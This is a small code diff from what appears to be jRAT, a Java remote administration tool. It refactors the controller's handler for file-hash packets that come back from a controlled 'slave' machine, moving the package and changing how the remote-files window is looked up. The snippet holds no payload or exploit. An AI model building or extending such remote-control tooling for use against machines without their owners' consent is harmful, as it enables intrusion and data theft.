@@ -1,7 +1,8 @@
-package jrat.controller.packets.incoming;
+package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.ui.frames.FrameRemoteFiles;
+import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.module.fs.ui.FrameRemoteFiles;
 
 import javax.swing.*;
 import java.io.DataInputStream;
@@ -14,7 +15,7 @@ public class Packet46FileHash extends AbstractIncomingPacket {
 		final String md5 = slave.readLine();
 		final String sha1 = slave.readLine();
 
-		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
+		FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
 		if (frame != null) {
 			if (frame.getFilesPanel().getRemoteTable().waitingForHash) {
 				new Thread() {
